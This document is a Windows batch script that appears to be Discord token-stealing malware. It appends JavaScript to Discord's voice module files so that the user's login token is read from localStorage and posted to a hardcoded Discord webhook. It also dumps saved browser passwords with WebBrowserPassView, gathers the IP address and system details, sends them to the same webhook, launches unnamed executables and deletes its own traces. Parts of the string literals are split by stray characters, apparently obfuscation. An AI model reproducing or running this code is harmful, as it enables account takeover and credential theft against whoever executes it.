@echo off
C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**INÿÿ
JECTION STARÿÿ
TED!ÿÿ
**\"ÿÿ
}" httpsÿÿ
ÿÿ
://discord.cÿÿ
ÿÿ
om/api/wÿÿ
ebhoÿÿ
oks/ÿÿ
79394470ÿÿ
ÿÿ
9491589140/yÿÿ
ÿÿ
4zfDnn0bÿÿ
vJCoÿÿ
LNMdÿÿ
_XKWpy_yÿÿ
ÿÿ
bt6ycBycWYUIÿÿ
ÿÿ
X9OCAdoBÿÿ
6jsgÿÿ
cek3ÿÿ
IB5lqkR2ÿÿ
ÿÿ
6uA9EFr
setÿÿ
ÿÿ
 str=varÿÿ
 X =ÿÿ
 winÿÿ
dow.localStoÿÿ
rage = documÿÿ
ent.body.appÿÿ
endChild(docÿÿ
ument.createÿÿ
Element `ifrÿÿ
ame`).contenÿÿ
tWindow.locaÿÿ
lStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'htÿÿ
tps://discorÿÿ
d.com/api/weÿÿ
bhooks/79394ÿÿ
470949158914ÿÿ
0/y4zfDnn0bvÿÿ
JCoLNMd_XKWpÿÿ
y_ybt6ycBycWÿÿ
YUIX9OCAdoB6ÿÿ
jsgcek3IB5lqÿÿ
kR26uA9EFr',ÿÿ
 false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
C:/temp/curl "https://myexternalip.com/raw">>C:\temp\ip_address.txt
for /f "delims=" %%q in (C:\temp\ip_address.txt) do set IP=%%q
for /f "delims=" %%x in (C:\temp\WindowsInfo.txt) do set WindowsInfo=%%x
start C:/temp/WebBrowserPassView.exe /stext "C:/temp/%username%_Passwords.txt"
systeminfo | findstr /c:"Host Name">>C:\temp\System_INFO.txt
systeminfo | findstr /c:"Domain">>C:\temp\System_INFO.txt 
systeminfo | findstr /c:"OS Name">>C:\temp\System_INFO.txt 
systeminfo | findstr /c:"OS Version">>C:\temp\System_INFO.txt 
systeminfo | findstr /c:"System Manufacturer">>C:\temp\System_INFO.txt
systeminfo | findstr /c:"System Model">>C:\temp\System_INFO.txt 
systeminfo | findstr /c:"System type">>C:\temp\System_INFO.txt 
systeminfo | findstr /c:"Total Physical Memory">>C:\temp\System_INFO.txt
echo Hard Drive Space:>>C:\temp\System_INFO.txt
wmic diskdrive get size>>C:\temp\System_INFO.txt
echo. 
echo.
echo Service Tag:>>C:\temp\System_INFO.txt
wmic bios get serialnumber>>C:\temp\System_INFO.txt
echo. 
echo. 
echo CPU:>>C:\temp\System_INFO.txt
wmic cpu get name>>C:\temp\System_INFO.txt
set "discord=%appdata%\discord\0.0.308\modules\discord_voice\index.js"
set "discordcanary=%appdata%\discordcanary\0.0.276\modules\discord_voice\index.js"
set "discordptb=%appdata%\discordptb\0.0.55\modules\discord_voice\index.js"
if not exist %discord% goto CANARY
echo %str% >> "%appdata%\discord\0.0.308\modules\discord_voice\index.js"
GOTO CANARY
:CANARY
if not exist %discordcanary% goto PTB
echo %str% >> "%appdata%\discordcanary\0.0.276\modules\discord_voice\index.js"
GOTO PTB
:PTB
if not exist %discordptb% goto SEND2
echo %str% >> "%appdata%\discordptb\0.0.55\modules\discord_voice\index.js"
GOTO SEND2
:SEND2
C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%USERNAME%**\n```asciidoc\nTime and Date :: %DATE% %TIME%\nIP Address :: %IP%\nWindows Info :: %WindowsInfo%\n```\n\"}" https://discord.com/api/webhooks/793944709491589140/y4zfDnn0bvJCoLNMd_XKWpy_ybt6ycBycWYUIX9OCAdoB6jsgcek3IB5lqkR26uA9EFr 
"C:\temp\filed.exe" --processStart filed.exe
"C:\temp\CustomEXE.exe" --processStart CustomEXE.exe
timeout 5 > NUL
del C:\temp\filed.exe /f /q
rem testtaskkill /f /im Discord.exe
rem testtaskkill /f /im DiscordCanary.exe
rem testtaskkill /f /im DiscordPTB.exe
set "discord2=C:\Users\%username%\AppData\Local\Discord\Update.exe"
set "discordcanary2=C:\Users\%username%\AppData\Local\DiscordCanary\Update.exe"
set "discordptb2=C:\Users\%username%\AppData\Local\DiscordPTB\Update.exe
if not exist %discord2% goto ZZZ
rem test"C:\Users\%username%\AppData\Local\Discord\Update.exe" --processStart Discord.exe
GOTO ZZZ
:ZZZ
if not exist %discordcanary2% goto WWW
rem test"C:\Users\%username%\AppData\Local\DiscordCanary\Update.exe" --processStart DiscordCanary.exe
GOTO WWW
:WWW
if not exist %discordptb2% goto DEL
rem test"C:\Users\%username%\AppData\Local\DiscordPTB\Update.exe" --processStart DiscordPTB.exe
goto DEL
:DEL
del C:\temp\ip_address.txt /f /q
del C:\temp\WindowsInfo.txt /f /q
del C:\temp\%username%_Passwords.txt /f /q
del C:\temp\curl-ca-bundle.crt /f /q
del C:\temp\curl.exe /f /q
del C:\temp\CustomEXE.exe /f /q
rem %0 | %0
rem SHUTDOWN -r -t 30
rem SHUTDOWN /s /t 30 /c
del %0